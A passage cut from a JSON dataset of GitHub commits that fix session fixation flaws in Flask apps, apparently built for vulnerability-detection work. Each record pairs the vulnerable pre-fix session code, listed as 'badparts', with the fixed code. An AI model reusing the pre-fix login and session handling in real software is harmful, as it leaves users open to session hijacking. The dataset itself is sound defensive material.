def store_user_id(self, user_id):\n        \"\"\"\n        Store a user's id for retrieval later\n        :param user_id: the user id\n        \"\"\"\n        pass\n\n    def has_user_id(self):\n        \"\"\"\n        Checks if a user has a stored id\n        :return: boolean value\n        \"\"\"\n        pass\n\n    def remove_user_id(self):\n        \"\"\"\n        Removes a user id from the session\n        \"\"\"\n        pass\n\n    def get_user_id(self):\n        \"\"\"\n        Retrieves a user's id\n        :return: the user's JWT\n        \"\"\"\n        pass\n\n    def store_user_ik(self, user_ik):\n        '''\n        Store a user's ik in the cookie for retrieval later\n        :param user_ik: the user ik\n        '''\n        logger.debug(\"SessionManager store_user_ik() - session %s\", session)\n        if USER_IK not in session:\n            session[USER_IK] = user_ik\n            session.permanent = True\n\n    def has_user_ik(self):\n        \"\"\"\n        Checks if a user has a stored ik\n        :return: boolean value\n        \"\"\"\n        logger.debug(\"SessionManager has_user_ik() - session %s\", session)\n        if USER_IK in session:\n            return session[USER_IK] is not None\n        else:\n            return False\n\n    def remove_user_ik(self):\n        \"\"\"\n        Removes a user id from the session\n        \"\"\"\n        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n        if USER_IK in session:\n            del session[USER_IK]\n\n    def get_user_ik(self):\n        \"\"\"\n        Retrieves a user's id\n        :return: the user's JWT\n        \"\"\"\n        logger.debug(\"SessionManager get_user_ik() - session %s\", session)\n        if self.has_user_ik():\n            return session[USER_IK]\n        else:\n            return None\n\n\nclass DatabaseSessionManager(SessionManagement):\n\n    def store_user_id(self, user_id):\n        logger.debug(\"DatabaseSessionManager store_user_id() - session %s\", session)\n        if EQ_SESSION_ID not in session:\n            eq_session_id = self.create_session_id()\n            logger.debug(\"Created new eq session id %s\", eq_session_id)\n            session[EQ_SESSION_ID] = eq_session_id\n            session.permanent = True\n            eq_session = EQSession(eq_session_id, user_id)\n            logger.debug(\"Constructed EQ Session object %s\", eq_session)\n        else:\n            eq_session_id = session[EQ_SESSION_ID]\n            logger.debug(\"Found eq_session_id %s in session\", eq_session_id)\n            eq_session = self._get_object(eq_session_id)\n            logger.debug(\"Loaded object eq session %s\", eq_session)\n        logger.debug(\"About to commit to database\")\n        db_session.add(eq_session)\n        db_session.commit()\n        logger.debug(\"Committed\")\n\n    def has_user_id(self):\n        logger.debug(\"DatabaseSessionManager has_user_id() - session %s\", session)\n        if EQ_SESSION_ID in session:\n            eq_session_id = session[EQ_SESSION_ID]\n\n            count = self.run_count(eq_session_id)\n            logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n            return count > 0\n\n    def remove_user_id(self):\n        logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n        if EQ_SESSION_ID in session:\n            eq_session_id = session[EQ_SESSION_ID]\n            eq_session = self._get_object(eq_session_id)\n            logger.debug(\"About to delete entry from eq_session table %s\", eq_session)\n            db_session.delete(eq_session)\n            db_session.commit()\n        else:\n            logger.warning(\"No eq session id exists\")\n\n    def get_user_id(self):\n        logger.debug(\"DatabaseSessionManager get_user_id() - session %s\", session)\n        if EQ_SESSION_ID in session:\n            eq_session_id = session[EQ_SESSION_ID]\n            eq_session = self._get_object(eq_session_id)\n            return eq_session.user_id\n        else:\n            return None\n\n    def create_session_id(self):\n        while True:\n            new_session_id = str(uuid4())\n            if self.check_unique(new_session_id):\n                break\n        return new_session_id\n\n    def check_unique(self, new_session_id):\n        return self.run_count(new_session_id) == 0\n\n    def _get_object(self, eq_session_id):\n        logger.debug(\"Get the EQ Session object for eq session id %s\", eq_session_id)\n        return EQSession.query.filter(EQSession.eq_session_id == eq_session_id).first()\n\n    def run_count(self, eq_session_id):\n        logger.debug(\"Running count query for eq session id %s\", eq_session_id)\n        count = EQSession.query.filter(EQSession.eq_session_id == eq_session_id).count()\n        return count\n\n\nclass FlaskSessionManager(SessionManagement):\n    def store_user_id(self, user_id):\n        logger.debug(\"FlaskSessionManager store_user_id() - session %s\", session)\n        if USER_ID not in session:\n            session[USER_ID] = user_id\n            session.permanent = True\n\n    def has_user_id(self):\n        logger.debug(\"FlaskSessionManager has_user_id() - session %s\", session)\n        if USER_ID in session:\n            return session[USER_ID] is not None\n        else:\n            return False\n\n    def remove_user_id(self):\n        logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n        if USER_ID in session:\n            del session[USER_ID]\n\n    def get_user_id(self):\n        logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session)\n        if self.has_user_id():\n            return session[USER_ID]\n        else:\n            return None\n\nif settings.EQ_SERVER_SIDE_STORAGE:\n    session_manager = DatabaseSessionManager()\nelse:\n    session_manager = FlaskSessionManager()\n"},"\/tests\/app\/authentication\/test_session_management.py":{"changes":[{"diff":"\n         with self.application.test_request_context():\n             self.session_manager.store_user_id(\"test\")\n             self.assertTrue(self.session_manager.has_user_id())\n-            self.session_manager.remove_user_id()\n+            self.session_manager.clear()\n             self.assertFalse(self.session_manager.has_user_id())\n \n \n","add":1,"remove":1,"filename":"\/tests\/app\/authentication\/test_session_management.py","badparts":["            self.session_manager.remove_user_id()"],"goodparts":["            self.session_manager.clear()"]},{"diff":"\n         with self.application.test_request_context():\n             self.session_manager.store_user_id(\"test\")\n             self.assertTrue(self.session_manager.has_user_id())\n-            self.session_manager.remove_user_id()\n+            self.session_manager.clear()\n             self.assertFalse(self.session_manager.has_user_id())\n \n \n","add":1,"remove":1,"filename":"\/tests\/app\/authentication\/test_session_management.py","badparts":["            self.session_manager.remove_user_id()"],"goodparts":["            self.session_manager.clear()"]}],"source":"\nfrom app.authentication.session_management import FlaskSessionManager, DatabaseSessionManager from flask import Flask import unittest from datetime import timedelta from app import settings class BaseSessionManagerTest(unittest.TestCase): def setUp(self): application=Flask(__name__) application.config['TESTING']=True application.secret_key='you will not guess' application.permanent_session_lifetime=timedelta(seconds=1) self.application=application self.session_manager=FlaskSessionManager() def test_has_token_empty(self): with self.application.test_request_context(): self.assertFalse(self.session_manager.has_user_id()) def test_has_token(self): with self.application.test_request_context(): self.session_manager.store_user_id(\"test\") self.assertTrue(self.session_manager.has_user_id()) def test_remove_token(self): with self.application.test_request_context(): self.session_manager.store_user_id(\"test\") self.assertTrue(self.session_manager.has_user_id()) self.session_manager.remove_user_id() self.assertFalse(self.session_manager.has_user_id()) class TestDatabaseSessionManager(BaseSessionManagerTest): def setUp(self): super().setUp() settings.EQ_SERVER_SIDE_STORAGE_DATABASE_URL=\"sqlite:\/\/\" self.session_manager=DatabaseSessionManager() class TestFlaskSessionManager(BaseSessionManagerTest): def setUp(self): super().setUp() self.session_manager=FlaskSessionManager() if __name__=='__main__': unittest.main() ","sourceWithComments":"from app.authentication.session_management import FlaskSessionManager, DatabaseSessionManager\nfrom flask import Flask\nimport unittest\nfrom datetime import timedelta\nfrom app import settings\n\n\nclass BaseSessionManagerTest(unittest.TestCase):\n    def setUp(self):\n        application = Flask(__name__)\n        application.config['TESTING'] = True\n        application.secret_key = 'you will not guess'\n        application.permanent_session_lifetime = timedelta(seconds=1)\n        self.application = application\n        self.session_manager = FlaskSessionManager()\n\n    def test_has_token_empty(self):\n        with self.application.test_request_context():\n            self.assertFalse(self.session_manager.has_user_id())\n\n    def test_has_token(self):\n        with self.application.test_request_context():\n            self.session_manager.store_user_id(\"test\")\n            self.assertTrue(self.session_manager.has_user_id())\n\n    def test_remove_token(self):\n        with self.application.test_request_context():\n            self.session_manager.store_user_id(\"test\")\n            self.assertTrue(self.session_manager.has_user_id())\n            self.session_manager.remove_user_id()\n            self.assertFalse(self.session_manager.has_user_id())\n\n\nclass TestDatabaseSessionManager(BaseSessionManagerTest):\n    def setUp(self):\n        super().setUp()\n        # Use an in memory database\n        settings.EQ_SERVER_SIDE_STORAGE_DATABASE_URL = \"sqlite:\/\/\"\n        self.session_manager = DatabaseSessionManager()\n\n\nclass TestFlaskSessionManager(BaseSessionManagerTest):\n\n    def setUp(self):\n        super().setUp()\n        self.session_manager = FlaskSessionManager()\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}},"msg":"Protect against session fixation attacks"}},"https:\/\/github.com\/ONSdigital\/census-survey-runner":{"01bb713a7c51a7d742c2dd24f3536a851cbdceb9":{"url":"https:\/\/api.github.com\/repos\/ONSdigital\/census-survey-runner\/commits\/01bb713a7c51a7d742c2dd24f3536a851cbdceb9","html_url":"https:\/\/github.com\/ONSdigital\/census-survey-runner\/commit\/01bb713a7c51a7d742c2dd24f3536a851cbdceb9","sha":"01bb713a7c51a7d742c2dd24f3536a851cbdceb9","keyword":"session fixation attack","diff":"diff --git a\/app\/authentication\/authenticator.py b\/app\/authentication\/authenticator.py\nindex 810ee7ba..e9bdb98b 100644\n--- a\/app\/authentication\/authenticator.py\n+++ b\/app\/authentication\/authenticator.py\n@@ -1,4 +1,5 @@\n import logging\n+from flask import session\n \n from app.authentication.invalid_token_exception import InvalidTokenException\n from app.authentication.jwt_decoder import JWTDecryptor\n@@ -36,6 +37,11 @@ def jwt_login(self, request):\n         :param request: The flask request\n         :return: the decrypted and unencoded token\n         \"\"\"\n+        # clear the session entry in the database\n+        session_manager.clear()\n+        # also clear the secure cookie data\n+        session.clear()\n+\n         if request.args.get(EQ_URL_QUERY_STRING_JWT_FIELD_NAME) is None:\n             raise NoTokenException(\"Please provide a token\")\n         token = self._jwt_decrypt(request)\ndiff --git a\/app\/authentication\/session_management.py b\/app\/authentication\/session_management.py\nindex 63c97a65..fad668ee 100644\n--- a\/app\/authentication\/session_management.py\n+++ b\/app\/authentication\/session_management.py\n@@ -25,7 +25,7 @@ def has_user_id(self):\n         \"\"\"\n         pass\n \n-    def remove_user_id(self):\n+    def clear(self):\n         \"\"\"\n         Removes a user id from the session\n         \"\"\"\n@@ -59,14 +59,6 @@ def has_user_ik(self):\n         else:\n             return False\n \n-    def remove_user_ik(self):\n-        \"\"\"\n-        Removes a user id from the session\n-        \"\"\"\n-        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n-        if USER_IK in session:\n-            del session[USER_IK]\n-\n     def get_user_ik(self):\n         \"\"\"\n         Retrieves a user's id\n@@ -109,7 +101,7 @@ def has_user_id(self):\n             logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n             return count > 0\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n         if EQ_SESSION_ID in session:\n             eq_session_id = session[EQ_SESSION_ID]\n@@ -163,10 +155,9 @@ def has_user_id(self):\n         else:\n             return False\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n-        if USER_ID in session:\n-            del session[USER_ID]\n+        session.clear()\n \n     def get_user_id(self):\n         logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session)\ndiff --git a\/tests\/app\/authentication\/test_session_management.py b\/tests\/app\/authentication\/test_session_management.py\nindex 9b586f8b..84f3bed5 100644\n--- a\/tests\/app\/authentication\/test_session_management.py\n+++ b\/tests\/app\/authentication\/test_session_management.py\n@@ -27,7 +27,7 @@ def test_remove_token(self):\n         with self.application.test_request_context():\n             self.session_manager.store_user_id(\"test\")\n             self.assertTrue(self.session_manager.has_user_id())\n-            self.session_manager.remove_user_id()\n+            self.session_manager.clear()\n             self.assertFalse(self.session_manager.has_user_id())\n \n \n","message":"","files":{"\/app\/authentication\/session_management.py":{"changes":[{"diff":"\n         \"\"\"\n         pass\n \n-    def remove_user_id(self):\n+    def clear(self):\n         \"\"\"\n         Removes a user id from the session\n         \"\"\"\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_ik(self):\n-        \"\"\"\n-        Removes a user id from the session\n-        \"\"\"\n-        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n-        if USER_IK in session:\n-            del session[USER_IK]\n-\n     def get_user_ik(self):\n         \"\"\"\n         Retrieves a user's id\n","add":0,"remove":8,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_ik(self):","        \"\"\"","        Removes a user id from the session","        \"\"\"","        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)","        if USER_IK in session:","            del session[USER_IK]"],"goodparts":[]},{"diff":"\n             logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n             return count > 0\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n         if EQ_SESSION_ID in session:\n             eq_session_id = session[EQ_SESSION_ID]\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n-        if USER_ID in session:\n-            del session[USER_ID]\n+        session.clear()\n \n     def get_user_id(self):\n         logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session","add":2,"remove":3,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):","        if USER_ID in session:","            del session[USER_ID]"],"goodparts":["    def clear(self):","        session.clear()"]},{"diff":"\n         \"\"\"\n         pass\n \n-    def remove_user_id(self):\n+    def clear(self):\n         \"\"\"\n         Removes a user id from the session\n         \"\"\"\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_ik(self):\n-        \"\"\"\n-        Removes a user id from the session\n-        \"\"\"\n-        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n-        if USER_IK in session:\n-            del session[USER_IK]\n-\n     def get_user_ik(self):\n         \"\"\"\n         Retrieves a user's id\n","add":0,"remove":8,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_ik(self):","        \"\"\"","        Removes a user id from the session","        \"\"\"","        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)","        if USER_IK in session:","            del session[USER_IK]"],"goodparts":[]},{"diff":"\n             logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n             return count > 0\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n         if EQ_SESSION_ID in session:\n             eq_session_id = session[EQ_SESSION_ID]\n","add":1,"remove":1,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):"],"goodparts":["    def clear(self):"]},{"diff":"\n         else:\n             return False\n \n-    def remove_user_id(self):\n+    def clear(self):\n         logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n-        if USER_ID in session:\n-            del session[USER_ID]\n+        session.clear()\n \n     def get_user_id(self):\n         logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session","add":2,"remove":3,"filename":"\/app\/authentication\/session_management.py","badparts":["    def remove_user_id(self):","        if USER_ID in session:","            del session[USER_ID]"],"goodparts":["    def clear(self):","        session.clear()"]}],"source":"\nfrom flask import session from app import settings from app.data_model.database import db_session, EQSession import logging from uuid import uuid4 USER_ID=\"user_id\" USER_IK=\"user_ik\" EQ_SESSION_ID=\"eq-session-id\" logger=logging.getLogger(__name__) class SessionManagement(object): def store_user_id(self, user_id): \"\"\" Store a user's id for retrieval later :param user_id: the user id \"\"\" pass def has_user_id(self): \"\"\" Checks if a user has a stored id :return: boolean value \"\"\" pass def remove_user_id(self): \"\"\" Removes a user id from the session \"\"\" pass def get_user_id(self): \"\"\" Retrieves a user's id :return: the user's JWT \"\"\" pass def store_user_ik(self, user_ik): ''' Store a user's ik in the cookie for retrieval later :param user_ik: the user ik ''' logger.debug(\"SessionManager store_user_ik() -session %s\", session) if USER_IK not in session: session[USER_IK]=user_ik session.permanent=True def has_user_ik(self): \"\"\" Checks if a user has a stored ik :return: boolean value \"\"\" logger.debug(\"SessionManager has_user_ik() -session %s\", session) if USER_IK in session: return session[USER_IK] is not None else: return False def remove_user_ik(self): \"\"\" Removes a user id from the session \"\"\" logger.debug(\"SessionManager remove_user_ik() -session %s\", session) if USER_IK in session: del session[USER_IK] def get_user_ik(self): \"\"\" Retrieves a user's id :return: the user's JWT \"\"\" logger.debug(\"SessionManager get_user_ik() -session %s\", session) if self.has_user_ik(): return session[USER_IK] else: return None class DatabaseSessionManager(SessionManagement): def store_user_id(self, user_id): logger.debug(\"DatabaseSessionManager store_user_id() -session %s\", session) if EQ_SESSION_ID not in session: eq_session_id=self.create_session_id() logger.debug(\"Created new eq session id %s\", eq_session_id) session[EQ_SESSION_ID]=eq_session_id session.permanent=True eq_session=EQSession(eq_session_id, user_id) logger.debug(\"Constructed EQ Session object %s\", eq_session) else: eq_session_id=session[EQ_SESSION_ID] logger.debug(\"Found eq_session_id %s in session\", eq_session_id) eq_session=self._get_object(eq_session_id) logger.debug(\"Loaded object eq session %s\", eq_session) logger.debug(\"About to commit to database\") db_session.add(eq_session) db_session.commit() logger.debug(\"Committed\") def has_user_id(self): logger.debug(\"DatabaseSessionManager has_user_id() -session %s\", session) if EQ_SESSION_ID in session: eq_session_id=session[EQ_SESSION_ID] count=self.run_count(eq_session_id) logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count) return count > 0 def remove_user_id(self): logger.debug(\"DatabaseSessionManager remove_user_id() -session %s\", session) if EQ_SESSION_ID in session: eq_session_id=session[EQ_SESSION_ID] eq_session=self._get_object(eq_session_id) logger.debug(\"About to delete entry from eq_session table %s\", eq_session) db_session.delete(eq_session) db_session.commit() else: logger.warning(\"No eq session id exists\") def get_user_id(self): logger.debug(\"DatabaseSessionManager get_user_id() -session %s\", session) if EQ_SESSION_ID in session: eq_session_id=session[EQ_SESSION_ID] eq_session=self._get_object(eq_session_id) return eq_session.user_id else: return None def create_session_id(self): while True: new_session_id=str(uuid4()) if self.check_unique(new_session_id): break return new_session_id def check_unique(self, new_session_id): return self.run_count(new_session_id)==0 def _get_object(self, eq_session_id): logger.debug(\"Get the EQ Session object for eq session id %s\", eq_session_id) return EQSession.query.filter(EQSession.eq_session_id==eq_session_id).first() def run_count(self, eq_session_id): logger.debug(\"Running count query for eq session id %s\", eq_session_id) count=EQSession.query.filter(EQSession.eq_session_id==eq_session_id).count() return count class FlaskSessionManager(SessionManagement): def store_user_id(self, user_id): logger.debug(\"FlaskSessionManager store_user_id() -session %s\", session) if USER_ID not in session: session[USER_ID]=user_id session.permanent=True def has_user_id(self): logger.debug(\"FlaskSessionManager has_user_id() -session %s\", session) if USER_ID in session: return session[USER_ID] is not None else: return False def remove_user_id(self): logger.debug(\"FlaskSessionManager remove_user_id() -session %s\", session) if USER_ID in session: del session[USER_ID] def get_user_id(self): logger.debug(\"FlaskSessionManager get_user_id() -session %s\", session) if self.has_user_id(): return session[USER_ID] else: return None if settings.EQ_SERVER_SIDE_STORAGE: session_manager=DatabaseSessionManager() else: session_manager=FlaskSessionManager() ","sourceWithComments":"from flask import session\nfrom app import settings\nfrom app.data_model.database import db_session, EQSession\nimport logging\nfrom uuid import uuid4\n\nUSER_ID = \"user_id\"\nUSER_IK = \"user_ik\"\nEQ_SESSION_ID = \"eq-session-id\"\nlogger = logging.getLogger(__name__)\n\n\nclass SessionManagement(object):\n    def store_user_id(self, user_id):\n        \"\"\"\n        Store a user's id for retrieval later\n        :param user_id: the user id\n        \"\"\"\n        pass\n\n    def has_user_id(self):\n        \"\"\"\n        Checks if a user has a stored id\n        :return: boolean value\n        \"\"\"\n        pass\n\n    def remove_user_id(self):\n        \"\"\"\n        Removes a user id from the session\n        \"\"\"\n        pass\n\n    def get_user_id(self):\n        \"\"\"\n        Retrieves a user's id\n        :return: the user's JWT\n        \"\"\"\n        pass\n\n    def store_user_ik(self, user_ik):\n        '''\n        Store a user's ik in the cookie for retrieval later\n        :param user_ik: the user ik\n        '''\n        logger.debug(\"SessionManager store_user_ik() - session %s\", session)\n        if USER_IK not in session:\n            session[USER_IK] = user_ik\n            session.permanent = True\n\n    def has_user_ik(self):\n        \"\"\"\n        Checks if a user has a stored ik\n        :return: boolean value\n        \"\"\"\n        logger.debug(\"SessionManager has_user_ik() - session %s\", session)\n        if USER_IK in session:\n            return session[USER_IK] is not None\n        else:\n            return False\n\n    def remove_user_ik(self):\n        \"\"\"\n        Removes a user id from the session\n        \"\"\"\n        logger.debug(\"SessionManager remove_user_ik() - session %s\", session)\n        if USER_IK in session:\n            del session[USER_IK]\n\n    def get_user_ik(self):\n        \"\"\"\n        Retrieves a user's id\n        :return: the user's JWT\n        \"\"\"\n        logger.debug(\"SessionManager get_user_ik() - session %s\", session)\n        if self.has_user_ik():\n            return session[USER_IK]\n        else:\n            return None\n\n\nclass DatabaseSessionManager(SessionManagement):\n\n    def store_user_id(self, user_id):\n        logger.debug(\"DatabaseSessionManager store_user_id() - session %s\", session)\n        if EQ_SESSION_ID not in session:\n            eq_session_id = self.create_session_id()\n            logger.debug(\"Created new eq session id %s\", eq_session_id)\n            session[EQ_SESSION_ID] = eq_session_id\n            session.permanent = True\n            eq_session = EQSession(eq_session_id, user_id)\n            logger.debug(\"Constructed EQ Session object %s\", eq_session)\n        else:\n            eq_session_id = session[EQ_SESSION_ID]\n            logger.debug(\"Found eq_session_id %s in session\", eq_session_id)\n            eq_session = self._get_object(eq_session_id)\n            logger.debug(\"Loaded object eq session %s\", eq_session)\n        logger.debug(\"About to commit to database\")\n        db_session.add(eq_session)\n        db_session.commit()\n        logger.debug(\"Committed\")\n\n    def has_user_id(self):\n        logger.debug(\"DatabaseSessionManager has_user_id() - session %s\", session)\n        if EQ_SESSION_ID in session:\n            eq_session_id = session[EQ_SESSION_ID]\n\n            count = self.run_count(eq_session_id)\n            logger.debug(\"Number of entries for eq session id %s is %s\", eq_session_id, count)\n            return count > 0\n\n    def remove_user_id(self):\n        logger.debug(\"DatabaseSessionManager remove_user_id() - session %s\", session)\n        if EQ_SESSION_ID in session:\n            eq_session_id = session[EQ_SESSION_ID]\n            eq_session = self._get_object(eq_session_id)\n            logger.debug(\"About to delete entry from eq_session table %s\", eq_session)\n            db_session.delete(eq_session)\n            db_session.commit()\n        else:\n            logger.warning(\"No eq session id exists\")\n\n    def get_user_id(self):\n        logger.debug(\"DatabaseSessionManager get_user_id() - session %s\", session)\n        if EQ_SESSION_ID in session:\n            eq_session_id = session[EQ_SESSION_ID]\n            eq_session = self._get_object(eq_session_id)\n            return eq_session.user_id\n        else:\n            return None\n\n    def create_session_id(self):\n        while True:\n            new_session_id = str(uuid4())\n            if self.check_unique(new_session_id):\n                break\n        return new_session_id\n\n    def check_unique(self, new_session_id):\n        return self.run_count(new_session_id) == 0\n\n    def _get_object(self, eq_session_id):\n        logger.debug(\"Get the EQ Session object for eq session id %s\", eq_session_id)\n        return EQSession.query.filter(EQSession.eq_session_id == eq_session_id).first()\n\n    def run_count(self, eq_session_id):\n        logger.debug(\"Running count query for eq session id %s\", eq_session_id)\n        count = EQSession.query.filter(EQSession.eq_session_id == eq_session_id).count()\n        return count\n\n\nclass FlaskSessionManager(SessionManagement):\n    def store_user_id(self, user_id):\n        logger.debug(\"FlaskSessionManager store_user_id() - session %s\", session)\n        if USER_ID not in session:\n            session[USER_ID] = user_id\n            session.permanent = True\n\n    def has_user_id(self):\n        logger.debug(\"FlaskSessionManager has_user_id() - session %s\", session)\n        if USER_ID in session:\n            return session[USER_ID] is not None\n        else:\n            return False\n\n    def remove_user_id(self):\n        logger.debug(\"FlaskSessionManager remove_user_id() - session %s\", session)\n        if USER_ID in session:\n            del session[USER_ID]\n\n    def get_user_id(self):\n        logger.debug(\"FlaskSessionManager get_user_id() - session %s\", session)\n        if self.has_user_id():\n            return session[USER_ID]\n        else:\n            return None\n\nif settings.EQ_SERVER_SIDE_STORAGE:\n    session_manager = DatabaseSessionManager()\nelse:\n    session_manager = FlaskSessionManager()\n"},"\/tests\/app\/authentication\/test_session_management.py":{"changes":[{"diff":"\n         with self.application.test_request_context():\n             self.session_manager.store_user_id(\"test\")\n             self.assertTrue(self.session_manager.has_user_id())\n-            self.session_manager.remove_user_id()\n+            self.session_manager.clear()\n             self.assertFalse(self.session_manager.has_user_id())\n \n \n","add":1,"remove":1,"filename":"\/tests\/app\/authentication\/test_session_management.py","badparts":["            self.session_manager.remove_user_id()"],"goodparts":["            self.session_manager.clear()"]},{"diff":"\n         with self.application.test_request_context():\n             self.session_manager.store_user_id(\"test\")\n             self.assertTrue(self.session_manager.has_user_id())\n-            self.session_manager.remove_user_id()\n+            self.session_manager.clear()\n             self.assertFalse(self.session_manager.has_user_id())\n \n \n","add":1,"remove":1,"filename":"\/tests\/app\/authentication\/test_session_management.py","badparts":["            self.session_manager.remove_user_id()"],"goodparts":["            self.session_manager.clear()"]}],"source":"\nfrom app.authentication.session_management import FlaskSessionManager, DatabaseSessionManager from flask import Flask import unittest from datetime import timedelta from app import settings class BaseSessionManagerTest(unittest.TestCase): def setUp(self): application=Flask(__name__) application.config['TESTING']=True application.secret_key='you will not guess' application.permanent_session_lifetime=timedelta(seconds=1) self.application=application self.session_manager=FlaskSessionManager() def test_has_token_empty(self): with self.application.test_request_context(): self.assertFalse(self.session_manager.has_user_id()) def test_has_token(self): with self.application.test_request_context(): self.session_manager.store_user_id(\"test\") self.assertTrue(self.session_manager.has_user_id()) def test_remove_token(self): with self.application.test_request_context(): self.session_manager.store_user_id(\"test\") self.assertTrue(self.session_manager.has_user_id()) self.session_manager.remove_user_id() self.assertFalse(self.session_manager.has_user_id()) class TestDatabaseSessionManager(BaseSessionManagerTest): def setUp(self): super().setUp() settings.EQ_SERVER_SIDE_STORAGE_DATABASE_URL=\"sqlite:\/\/\" self.session_manager=DatabaseSessionManager() class TestFlaskSessionManager(BaseSessionManagerTest): def setUp(self): super().setUp() self.session_manager=FlaskSessionManager() if __name__=='__main__': unittest.main() ","sourceWithComments":"from app.authentication.session_management import FlaskSessionManager, DatabaseSessionManager\nfrom flask import Flask\nimport unittest\nfrom datetime import timedelta\nfrom app import settings\n\n\nclass BaseSessionManagerTest(unittest.TestCase):\n    def setUp(self):\n        application = Flask(__name__)\n        application.config['TESTING'] = True\n        application.secret_key = 'you will not guess'\n        application.permanent_session_lifetime = timedelta(seconds=1)\n        self.application = application\n        self.session_manager = FlaskSessionManager()\n\n    def test_has_token_empty(self):\n        with self.application.test_request_context():\n            self.assertFalse(self.session_manager.has_user_id())\n\n    def test_has_token(self):\n        with self.application.test_request_context():\n            self.session_manager.store_user_id(\"test\")\n            self.assertTrue(self.session_manager.has_user_id())\n\n    def test_remove_token(self):\n        with self.application.test_request_context():\n            self.session_manager.store_user_id(\"test\")\n            self.assertTrue(self.session_manager.has_user_id())\n            self.session_manager.remove_user_id()\n            self.assertFalse(self.session_manager.has_user_id())\n\n\nclass TestDatabaseSessionManager(BaseSessionManagerTest):\n    def setUp(self):\n        super().setUp()\n        # Use an in memory database\n        settings.EQ_SERVER_SIDE_STORAGE_DATABASE_URL = \"sqlite:\/\/\"\n        self.session_manager = DatabaseSessionManager()\n\n\nclass TestFlaskSessionManager(BaseSessionManagerTest):\n\n    def setUp(self):\n        super().setUp()\n        self.session_manager = FlaskSessionManager()\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}},"msg":"Protect against session fixation attacks"}},"https:\/\/github.com\/joelbcastillo\/openrecords_v2_0":{"95cea5e2342f6807df783a8547e75a81bffe060d":{"url":"https:\/\/api.github.com\/repos\/joelbcastillo\/openrecords_v2_0\/commits\/95cea5e2342f6807df783a8547e75a81bffe060d","html_url":"https:\/\/github.com\/joelbcastillo\/openrecords_v2_0\/commit\/95cea5e2342f6807df783a8547e75a81bffe060d","message":"prevent session fixation attacks","sha":"95cea5e2342f6807df783a8547e75a81bffe060d","keyword":"session fixation prevent","diff":"diff --git a\/app\/auth\/views.py b\/app\/auth\/views.py\nindex ff4436a4..e68ad498 100644\n--- a\/app\/auth\/views.py\n+++ b\/app\/auth\/views.py\n@@ -73,6 +73,7 @@ def ldap_login():\n \n             if authenticated:\n                 login_user(user)\n+                session.regenerate()  # KVSession.regenerate()\n                 session['user_id'] = current_user.get_id()\n \n                 return_to_url = request.form.get('return_to_url')\ndiff --git a\/config.py b\/config.py\nindex 5660f7d2..6b1aee8e 100644\n--- a\/config.py\n+++ b\/config.py\n@@ -17,7 +17,7 @@ class Config:\n                          os.path.join(os.path.abspath(os.path.dirname(__file__)), 'logs\/'))\n \n     APP_TIMEZONE = os.environ.get('APP_TIMEZONE') or 'US\/Eastern'\n-    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True\n+    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') == 'True'\n \n     # Note: BASE_URL and VIEW_REQUEST_ENDPOINT used for the automatic status update job (jobs.py)\n     BASE_URL = os.environ.get('BASE_URL')\n","files":{"\/config.py":{"changes":[{"diff":"\n                          os.path.join(os.path.abspath(os.path.dirname(__file__)), 'logs\/'))\n \n     APP_TIMEZONE = os.environ.get('APP_TIMEZONE') or 'US\/Eastern'\n-    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True\n+    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') == 'True'\n \n     # Note: BASE_URL and VIEW_REQUEST_ENDPOINT used for the automatic status update job (jobs.py)\n     BASE_URL = os.environ.get('BASE_URL')\n","add":1,"remove":1,"filename":"\/config.py","badparts":["    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True"],"goodparts":["    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') == 'True'"]},{"diff":"\n                          os.path.join(os.path.abspath(os.path.dirname(__file__)), 'logs\/'))\n \n     APP_TIMEZONE = 